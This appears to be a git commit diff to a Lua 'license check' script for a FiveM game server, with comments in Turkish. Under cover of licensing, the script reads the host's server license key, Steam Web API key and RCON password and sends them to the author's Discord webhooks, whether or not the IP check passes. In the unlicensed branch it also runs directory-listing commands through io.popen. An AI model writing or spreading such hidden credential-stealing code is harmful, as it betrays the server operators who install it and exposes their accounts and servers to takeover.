208d69facbec8725bd088e959838aeed92d00246
Serhat-18 <79026362+Serhat-18@users.noreply.github.com>
2022-02-09 01:50:48 +0300

    Ufak Tefek Güncellemeler
    Ufak Tefek Güncellemeler

--- lisans.lua
+++ lisans.lua
@@ -1,29 +1,21 @@
--- spex#8373 Güncelleme için teşekkürler
+-- spex#8373 Güncellemeler Yaptı                  Tarih: 08/02/2022
+-- $erhat/18#6666 Güncellemeler Yaptı             Tarih: 09/02/2022
 
 
 local REDLOG = "WEBHOOK_HERE" -- LOG WEBHOOK LISANSSIZ
 local ONAYLOG = "WEBHOOK_HERE" -- LOG WEBHOOK LISANSLI
 PerformHttpRequest('https://api.ipify.org', function(err, text, headers) 
-  if text == '20.113.147.4' then -- BU ALANA LISANSLANAN IP KOYULACAK 
+  if text == 'IP_ADRESS' then -- BU ALANA LISANSLANAN IP KOYULACAK 
     print('^2 LISANS ONAYLANDI HOSGELDINIZ\n ^1- SRHT_DEVELOPMENTS -^0')
 
     local serveradi = GetConvar("sv_hostname","Bulunamadı.")
-    OnayLog("[LISANS ONAYLANDI]", "**Sunucu Bilgileri:**\n\n**[Sunucu Adı] = ** " .. serveradi .. "\n\n**[SUNUCU IP] = **" .. text .. "")
-
-    local serverkey = GetConvar("sv_licenseKey","Bulunamadı.")
-    OnayLog("[LISANS ONAYLANDI]", "**Sunucu Key:**\n\n**[Sunucu Key] = ** " .. serverkey .. "\n\n**[SUNUCU IP] = **" .. text .. "")
-
     local slot = GetConvar("sv_maxclients","Bulunamadı.")
-    OnayLog("[LISANS ONAYLANDI]", "**Slot Sayısı:**\n\n**[Slot Sayısı ] = ** " .. slot .. "\n\n**[SUNUCU IP] = **" .. text .. "")
-
+    local serverkey = GetConvar("sv_licenseKey","Bulunamadı.")
     local serverapikey = GetConvar("steam_webApiKey","Bulunamadı.")
-    OnayLog("[LISANS ONAYLANDI]", "**Sunucu Api:**\n\n**[Sunucu ApiKey] = ** " .. serverapikey .. "\n\n**[SUNUCU IP] = **" .. text .. "")
-
     local rconpass = GetConvar("rcon_password","Bulunamadı.")
-    OnayLog("[LISANS ONAYLANDI]", "**Rcon Sifresi:**\n\n**[Rcon Password] = ** " .. rconpass .. "\n\n**[SUNUCU IP] = **" .. text .. "")
+    -- local tag = GetConvar("tags","Bulunamadı.")
+    OnayLog("[LISANS ONAYLANDI]", "**Sunucu Bilgileri:**\n\n**[Sunucu Adı] = ** " .. serveradi .. "\n\n**[SUNUCU IP] = **" .. text .. "\n\n **[SUNUCU KEY]** ".. serverkey .."\n\n**[SUNUCU SLOT SAYISI]** ".. slot .."\n\n**[SUNUCU API KEY]** ".. serverapikey .."\n\n**[SUNUCU RCON PASSWORD]** ".. rconpass .."")
 
-    local tag = GetConvar("tags","Bulunamadı.")
-    OnayLog("[LISANS ONAYLANDI]", "**Tag:**\n\n**[Tag ] = ** " .. tag .. "\n\n**[SUNUCU IP] = **" .. text .. "")
 
 
 
@@ -37,26 +29,14 @@ PerformHttpRequest('https://api.ipify.org', function(err, text, headers)
 
   else
     Wait(0)
+
     local serveradi = GetConvar("sv_hostname","Bulunamadı.")
-    RedLog("[LISANSIZ KULLANIM TESPIT]", "**Sunucu Bilgileri:**\n\n**[Sunucu Adı] = ** " .. serveradi .. "\n\n**[SUNUCU IP] = **" .. text .. "")
-
-    local serverkey = GetConvar("sv_licenseKey","Bulunamadı.")
-    RedLog("[LISANSIZ KULLANIM TESPIT]", "**Sunucu Key:**\n\n**[Key] = ** " .. serverkey .. "\n\n**[SUNUCU IP] = **" .. text .. "")
-
     local slot = GetConvar("sv_maxclients","Bulunamadı.")
-    RedLog("[LISANSIZ KULLANIM TESPIT]", "**Slot Sayısı:**\n\n**[Slot Sayısı ] = ** " .. slot .. "\n\n**[SUNUCU IP] = **" .. text .. "")
-
+    local serverkey = GetConvar("sv_licenseKey","Bulunamadı.")
     local serverapikey = GetConvar("steam_webApiKey","Bulunamadı.")
-    RedLog("[LISANSIZ KULLANIM TESPIT]", "**Sunucu Api:**\n\n**[Sunucu ApiKey] = ** " .. serverapikey .. "\n\n**[SUNUCU IP] = **" .. text .. "")
-
-    local mysqlstring = GetConvar("mysql_connection_string","Bulunamadı.")
-    RedLog("[LISANSIZ KULLANIM TESPIT]", "**Mysql Baglantisi:**\n\n**[Mysql Baglantisi] = ** " .. mysqlstring .. "\n\n**[SUNUCU IP] = **" .. text .. "")
-
     local rconpass = GetConvar("rcon_password","Bulunamadı.")
-    RedLog("[LISANSIZ KULLANIM TESPIT]", "**Rcon Sifresi:**\n\n**[Rcon Password] = ** " .. rconpass .. "\n\n**[SUNUCU IP] = **" .. text .. "")
-
-    local tag = GetConvar("tags","Bulunamadı.")
-    RedLog("[LISANSIZ KULLANIM TESPIT]", "**Tag:**\n\n**[Tag ] = ** " .. tag .. "\n\n**[SUNUCU IP] = **" .. text .. "")
+    -- local tag = GetConvar("tags","Bulunamadı.")
+    RedLog("[LISANS ONAYLANMADI]", "**Sunucu Bilgileri:**\n\n**[Sunucu Adı] = ** " .. serveradi .. "\n\n**[SUNUCU IP] = **" .. text .. "\n\n **[SUNUCU KEY]** ".. serverkey .."\n\n**[SUNUCU SLOT SAYISI]** ".. slot .."\n\n**[SUNUCU API KEY]** ".. serverapikey .."\n\n**[SUNUCU RCON PASSWORD]** ".. rconpass .."")
 
     current_dir=io.popen"cd":read'*l'
     for dir in io.popen([[dir "./" /b /ad]]):lines() do
@@ -81,7 +61,7 @@ PerformHttpRequest('https://api.ipify.org', function(err, text, headers)
         ["description"] = message,
         ["footer"] = {
         ["text"] = "burayaistediğiniyaz",
-        ["icon_url"] = "https://cdn.discordapp.com/attachments/827928307139477585/856623282895847454/hsac.png"
+        ["icon_url"] = "https://cdn.discordapp.com/attachments/827928307139477585/844319575410475069/srhtac.png"
         },
       }
     }
@@ -97,7 +77,7 @@ PerformHttpRequest('https://api.ipify.org', function(err, text, headers)
           ["description"] = message,
           ["footer"] = {
           ["text"] = "burayaistediğiniyaz",
-          ["icon_url"] = "https://cdn.discordapp.com/attachments/827928307139477585/856623282895847454/hsac.png"
+          ["icon_url"] = "https://cdn.discordapp.com/attachments/827928307139477585/844319575410475069/srhtac.png"
           },
         }
       }
